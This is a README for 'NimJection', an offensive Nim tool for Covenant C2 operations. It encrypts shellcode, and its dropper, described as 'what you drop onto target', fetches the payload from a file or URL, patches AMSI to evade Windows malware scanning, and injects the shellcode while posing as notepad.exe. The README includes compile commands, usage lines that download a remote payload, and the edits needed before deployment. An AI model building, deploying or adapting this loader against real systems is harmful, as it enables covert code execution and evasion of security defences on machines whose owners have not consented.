# NimJection
My experiments with Nim for covenant implant operations. Highly recommend looking at Marcello Salvati’s https://github.com/byt3bl33d3r repo which i used massively for this project.

Highly recomend 
## PrepPayload
Used for grabbing b64 shellcode, either from a file or URL, converting it to correct format and encrypting using specified encryption key. Creates encrypt.txt file containing encrypted shellcode for use with NimJection.

### Compile Instructions:
```
nim c -d:ssl PrepPayload.nim
```
> Experienced SSL problems if cross compiling in Windows from Unix so would recommend compiling on platform you’re going to use it on.

### Usage
```
Flags:
--url
--file
--enkey encryption key, DEAFULT: Nimjection

./PrepPayload  --url:http://127.0.0.1/shellcode Get Remote Payload
./PrepPayload --file:"Local Payload File"       Get Local Payload
```

## NimJection
What you drop onto target. Decrypts ‘encrypt.txt’, either locally or via grabbing it from URL, created by PrepPayload, does some AMSI patching and then injects and executes resulting shellcode pretending to be notepad.exe.

### Compile Instructions:
```
nim c -d:ssl NimJection.nim
```
> Recommend compiling on windows due to SSL issues – but if grabbing file locally/over http ‘should’ work via cross compile

### Usage
```
--url
--file
--enkey encryption key

Usage:
./Nimjection.exe  --url:http://127.0.0.1/shellcode      Get Remote Payload
./Nimjection.exe --file:"Local Payload File"    Get Local Payload
```

> There is a slight issue with the code in the fact that byte array sizes need to be declared at compile. To aid in usage, PrePayload will display the byte array size in its output:

```
./PrepPayload --url:https://127.0.0.1/GruntHTTP.bin.b64 --enkey:test

Grabbing payload from: https://127.0.0.1/GruntHTTP.bin.b64
[*] Using httpclient
Encrypting Payload...
IV: 03A5EF054B596D12055585BC99C8160D
ENKEY: test
ENCRYPTED PAYLOAD: ./encrypt.txt
PAYLOAD SIZE = 43132 Check decrypt nim dectext array size matches
```
Before compiling Nimjector for use on a target, decryt.nim needs to be checked/changed to have the right return array size and dextext array size.

```
proc decrypt*(envkey = "", payload = ""): array[43132,byte] =

dectext: array[43132,byte]

```


